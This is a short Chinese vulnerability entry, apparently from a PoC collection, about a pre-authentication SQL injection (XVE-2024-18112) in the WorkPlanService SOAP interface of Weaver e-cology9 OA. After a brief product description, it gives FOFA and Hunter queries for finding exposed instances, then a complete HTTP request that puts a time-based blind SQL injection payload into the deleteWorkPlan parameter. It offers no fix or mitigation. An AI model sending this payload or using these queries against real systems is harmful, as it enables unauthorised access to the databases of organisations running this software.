# 泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology9系统WorkPlanService前台存在SQL注入漏洞。

## fofa

```java
app="泛微-协同商务系统"
```

## hunter

```java
app.name=="泛微 e-cology 9.0 OA"
```

## poc

```yaml
POST /services/WorkPlanService HTTP/1.1
HOST: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Content-Type: text/xml;charset=UTF-8
Connection: close
 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
    <soapenv:Header/>
      <soapenv:Body>
      <web:deleteWorkPlan>
         <!--type: string-->
         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>
         <!--type: int-->
         <web:in1>22</web:in1> 
      </web:deleteWorkPlan>
      </soapenv:Body>
</soapenv:Envelope>
```

![image-20240726172205428](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407261722628.png)
